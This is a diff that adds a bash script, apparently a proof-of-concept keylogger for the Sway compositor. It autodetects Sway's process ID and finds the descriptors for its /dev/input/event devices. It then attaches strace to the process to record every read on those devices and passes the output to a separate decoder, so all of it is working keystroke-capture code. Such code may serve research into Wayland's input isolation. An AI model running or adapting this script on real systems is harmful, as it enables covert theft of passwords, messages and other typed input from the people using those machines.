@@ -1,0 +1,161 @@
+#!/bin/bash
+
+APP="$0"
+HERE=$(dirname "$0") 
+DECODER="$HERE/sway-keylogger-decoder"
+
+usage () {
+    echo "Usage: $APP [OPTIONS]"
+    echo "  -p NUM            Specify the pid of the Sway process."
+    echo "                    Default is autodetection using various methods."
+    echo "  -r                Print the raw data. Default is to decode using"
+    echo "                    $DECODER"
+    echo "  -f NUM[,NUM ...]  Set the list of file ids to trace." 
+    echo "  -l                List the file ids corresponding to" 
+    echo "                    input devices." 
+    echo "" 
+    exit 1    
+}
+
+#
+# That filter is basically equivalent to
+#    grep -B 1 -G '^ |' 
+# except that its output is not buffered.
+#
+# Firtering the output of strace is not strictly  
+# needed but can significantly reduce the size of the
+# output.
+#
+filter () {
+    local IFS=$'\n'
+    local prev=""
+    local line
+    while read line ; do
+        if [[ "$line" =~ ^\ \| ]] ; then
+            [[ -n "$prev" ]] && echo "$prev"
+            prev=""
+            echo "$line"
+        else
+            prev="$line"
+        fi    
+    done 
+}
+
+input_name () {
+    cat /sys/class/input/$(basename "$1")/device/name
+}
+
+PID=""
+FDS=""
+LIST=
+RAW=
+
+while [[ $# -gt 0 ]] ; do
+    key="$1"
+
+    case $key in
+        -p)
+            PID="$2"
+            shift 
+            shift 
+            ;;
+
+        -f)
+            FDS="$2"
+            shift 
+            shift 
+            ;;
+
+        -l)
+            LIST=1
+            shift
+            ;;
+
+        -r)
+            RAW=1
+            shift
+            ;;
+        *)
+            usage           
+    esac
+done
+        
+# Use various methods to find the pid of sway 
+
+# Try the SWAYSOCK environment variable
+if [[ -z "$PID" ]] ; then
+    if [[ "$SWAYSOCK" =~ \.([0-9]+)\.sock$ ]] ; then
+        PID="${BASH_REMATCH[1]}"
+    fi
+fi
+
+# Try pgrep
+if [[ -z "$PID" ]] ; then
+    PID=$(pgrep -u "$USER" '^sway$' 2>/dev/null | head -n 1)
+fi
+
+# Try pidof
+if [[ -z "$PID" ]] ; then    
+    PID=$(pidof sway 2>/dev/null | head -n 1)
+fi
+
+if [[ -z "$PID" ]] ; then
+    echo "Error: Autodection failed. Please specify a pid using -p option" >&2
+fi
+
+echo "# Using PID=$PID" ;
+
+if [[ ! -d "/proc/$PID/fd" || ! -r "/proc/$PID/fd" ]] ; then
+    echo "Error: Directory /proc/$PID/fd not found or not readable"
+    exit 1
+fi
+
+#
+# List 
+#
+if [[ -n "$LIST" ]] ; then
+    echo "List input devices in /proc/$PID/fd/ "
+    found=0
+    for fd in /proc/"$PID"/fd/* ; do        
+        file="$(readlink $fd)"
+        case "$file" in
+            /dev/input/event*)
+                printf "%3d = %-20s (%s)\n" \
+                       "$(basename $fd)" \
+                       "$file" \
+                       "$(input_name "$file")"
+                found=1
+                ;;
+        esac
+    done
+    [[ $found == 0 ]] && echo No input devices are available 
+    exit 1 
+fi
+
+
+if [[ -z "$FDS" ]] ; then
+    # Default is to trace all input devices opened by the process. 
+    for fd in /proc/"$PID"/fd/* ; do
+        file="$(readlink $fd)"
+        case "$file" in
+            /dev/input/event*)
+                printf "# Trace %3d = %-20s (%s)\n" \
+                       "$(basename $fd)" \
+                       "$file" \
+                       "$(input_name "$file")" 
+                FDS+="${FDS:+,}$(basename "$fd")" ;        
+                ;;
+        esac
+    done
+fi
+
+CMD="strace -s 0 -p $PID -o /dev/stdout -e trace=read -e read=$FDS"
+
+if [[ -z "$RAW" ]] ; then
+    echo "# $CMD | $DECODER"
+    $CMD | $DECODER
+else
+    echo "# $CMD"
+    $CMD | filter
+fi
+
